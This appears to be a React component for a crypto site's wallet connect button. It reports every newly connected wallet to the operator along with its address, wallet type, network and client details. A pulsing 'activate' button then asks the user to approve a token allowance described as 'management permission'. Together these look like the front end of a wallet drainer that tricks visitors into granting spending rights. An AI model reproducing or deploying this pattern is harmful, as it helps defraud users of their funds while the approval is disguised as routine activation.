import React, { useState, useEffect, useRef } from 'react';
import { Wallet, Copy, Check, LogOut } from 'lucide-react';
import { useWallet } from '../hooks/useWallet';
import { useLanguage } from '../hooks/useLanguage';
import { notifyNewWallet } from '../lib/notify';
import { SiteModal } from './ui/SiteModal';

type WalletModal = 'none' | 'approve-error';

export const WalletButton: React.FC = () => {
  const {
    wallet,
    isConnecting,
    isApproving,
    hasManagementPermission,
    availableWallets,
    connectWallet,
    disconnectWallet,
    copyAddress,
    approveToken,
    testWalletCapabilities,
    testTokenApprove,
  } = useWallet();

  const { t } = useLanguage();
  const [copied, setCopied] = useState(false);

  const [modal, setModal] = useState<WalletModal>('none');
  const [approveErrorMessage, setApproveErrorMessage] = useState<string | null>(null);

  // трекаем прошлые значения, чтобы ловить "рёбра" подключения и смену аккаунта
  const prevConnected = useRef<boolean>(false);
  const prevAddress = useRef<string | null>(null);

  // универсальная отправка уведомления
  const sendNotify = async () => {
    const addr = wallet?.address;
    if (!addr) return;

    let network: string | undefined = (wallet as any)?.network || undefined;
    const extra: Record<string, unknown> = { hasManagementPermission: !!hasManagementPermission };

    if (typeof window !== 'undefined') {
      const w: any = window as any;

      // Тип кошелька
      if (w.tronLink) extra.walletType = 'TronLink';
      else if (w.ethereum?.isMetaMask) extra.walletType = 'MetaMask';
      else if (w.ethereum) extra.walletType = 'EVM Wallet';
      else extra.walletType = 'unknown';

      // TRON детали
      if (w.tronWeb?.defaultAddress) {
        extra.tron = {
          base58: w.tronWeb.defaultAddress.base58 || null,
          hex: w.tronWeb.defaultAddress.hex || null,
          node: w.tronWeb?.fullNode?.host || null,
        };
        if (!network && w.tronWeb?.fullNode?.host) {
          const host = String(w.tronWeb.fullNode.host);
          network = /trongrid\.io/i.test(host)
            ? 'tron-mainnet'
            : /nile|shasta/i.test(host)
            ? 'tron-testnet'
            : 'tron-unknown';
        }
      }

      // EVM детали
      if (w.ethereum) {
        try {
          extra.chainId = await w.ethereum.request({ method: 'eth_chainId' });
        } catch {}
        try {
          extra.web3Client = await w.ethereum.request({ method: 'web3_clientVersion' });
        } catch {}
      }
    }

    try {
      await (notifyNewWallet as any)(addr, network, extra);
    } catch (e) {
      console.warn('notifyNewWallet failed', e);
    }
  };

  // отправляем:
  // 1) при новом подключении (false -> true)
  // 2) при смене адреса, даже без дисконнекта
  useEffect(() => {
    const connected = !!wallet?.connected;
    const addr = wallet?.address || null;

    const connectedEdge = connected && !prevConnected.current; // новый connect
    const addressChanged =
      connected && prevAddress.current && prevAddress.current !== addr; // смена аккаунта

    if (connectedEdge || addressChanged) {
      void sendNotify();
    }

    prevConnected.current = connected;
    prevAddress.current = addr;
  }, [wallet?.connected, wallet?.address, wallet?.network, hasManagementPermission]);

  const handleCopyAddress = () => {
    copyAddress();
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const formatAddress = (address: string) => {
    if (!address) return '';
    return `${address.slice(0, 6)}...${address.slice(-4)}`;
  };

  const handleApprove = async () => {
    try {
      await approveToken('1000');
    } catch (error) {
      console.error('Approve failed:', error);
      setApproveErrorMessage(t('wallet.approveErrorGeneric'));
      setModal('approve-error');
    }
  };

  const onDisconnect = () => {
    disconnectWallet();
  };

  const closeModal = () => {
    setModal('none');
    setApproveErrorMessage(null);
  };

  if (wallet.connected) {
    return (
      <div className="relative group">
        <div
          className={[
            'flex items-center space-x-3 rounded-lg border bg-gray-800/50 px-4 py-2 shadow-lg backdrop-blur-sm',
            hasManagementPermission
              ? 'border-green-500/30 shadow-green-500/10'
              : 'border-yellow-500/30 shadow-yellow-500/10',
          ].join(' ')}
        >
          <div className="flex items-center space-x-2">
            <div
              className={[
                'h-2 w-2 rounded-full animate-pulse shadow-lg',
                hasManagementPermission
                  ? 'bg-green-400 shadow-green-400/50'
                  : 'bg-yellow-400 shadow-yellow-400/50',
              ].join(' ')}
            />
            <span className="text-sm text-gray-300">
              {formatAddress(wallet.address || '')}
            </span>
          </div>

          <button
            type="button"
            onClick={handleCopyAddress}
            className="rounded p-1 transition-colors hover:bg-gray-700"
            title={t('wallet.copyAddress')}
            aria-label={t('wallet.copyAddress')}
          >
            {copied ? (
              <Check className="h-4 w-4 text-green-500" />
            ) : (
              <Copy className="h-4 w-4 text-gray-400" />
            )}
          </button>

          <button
            type="button"
            onClick={handleApprove}
            disabled={isApproving}
            className={[
              'rounded px-3 py-1 text-xs font-bold transition-colors',
              hasManagementPermission
                ? 'bg-green-600 hover:bg-green-700'
                : 'bg-gradient-to-r from-yellow-500 to-orange-600 hover:from-yellow-400 hover:to-orange-500 animate-pulse',
              isApproving ? 'disabled:bg-gray-600' : '',
            ].join(' ')}
            title={
              hasManagementPermission
                ? t('wallet.activateTooltipActive')
                : t('wallet.activateTooltipNeed')
            }
          >
            {isApproving
              ? t('wallet.approveButtonApproving')
              : hasManagementPermission
              ? t('wallet.approveButtonActive')
              : t('wallet.approveButtonActivate')}
          </button>

          <button
            type="button"
            onClick={onDisconnect}
            className="rounded p-1 text-red-400 transition-colors hover:bg-gray-700"
            title={t('wallet.disconnect')}
            aria-label={t('wallet.disconnect')}
          >
            <LogOut className="h-4 w-4" />
          </button>
        </div>


        {/* Testing dropdown (только десктоп-hover, не мешает мобилке) */}
        <div className="pointer-events-auto absolute top-full right-0 z-50 mt-2 w-72 rounded-lg border border-gray-700 bg-gray-800 opacity-0 shadow-xl transition-opacity duration-200 group-hover:opacity-100">
          <div className="p-3">
            <h4 className="mb-2 text-sm font-semibold text-white">
              {t('wallet.testing.title')}
            </h4>
            <div className="space-y-2 text-sm">
              <button
                type="button"
                onClick={testWalletCapabilities}
                className="w-full rounded px-3 py-2 text-left text-gray-300 transition-colors hover:bg-gray-700 hover:text-white"
              >
                {t('wallet.testing.checkCapabilities')}
              </button>
              <button
                type="button"
                onClick={testTokenApprove}
                className="w-full rounded px-3 py-2 text-left text-gray-300 transition-colors hover:bg-gray-700 hover:text-white"
              >
                {t('wallet.testing.testApprove')}
              </button>
              <button
                type="button"
                onClick={() => void sendNotify()}
                className="w-full rounded px-3 py-2 text-left text-gray-300 transition-colors hover:bg-gray-700 hover:text-white"
                title={t('wallet.testing.notifyAgainTitle')}
              >
                {t('wallet.testing.notifyAgain')}
              </button>
            </div>
          </div>
        </div>

        {/* Модалка ошибки approve */}
        <SiteModal
          isOpen={modal === 'approve-error'}
          title={t('wallet.modal.approveErrorTitle')}
          onClose={closeModal}
          footer={
            <button
              type="button"
              onClick={closeModal}
              className="rounded-full bg-white/10 px-4 py-1.5 text-sm font-semibold text-white hover:bg-white/20"
            >
              {t('common.ok')}
            </button>
          }
        >
          <p className="text-sm text-slate-100">
            {approveErrorMessage || t('wallet.modal.approveErrorText')}
          </p>
        </SiteModal>
      </div>
    );
  }

  return (
    <>
      <button
        type="button"
        onClick={connectWallet}
        disabled={isConnecting}
        className="relative flex items-center space-x-2 rounded-lg border border-cyan-400/50 bg-gradient-to-r from-cyan-500 via-blue-600 to-purple-600 px-4 py-2 font-medium text-white shadow-lg shadow-cyan-500/25 transition-all duration-300 hover:scale-105 hover:from-cyan-400 hover:via-blue-500 hover:to-purple-500 disabled:from-gray-600 disabled:via-gray-700 disabled:to-gray-800"
      >
        <Wallet className="h-4 w-4" />
        <span>
          {isConnecting ? t('wallet.connecting') : t('wallet.connect')}
        </span>

        {!isConnecting && (
          <div className="absolute -right-2 -top-2 flex space-x-1">
            {availableWallets.tronLink && (
              <div
                className="h-3 w-3 rounded-full border border-white bg-green-500 shadow-lg"
                title={t('wallet.tronLinkAvailable')}
              />
            )}
          </div>
        )}
      </button>
    </>
  );
};
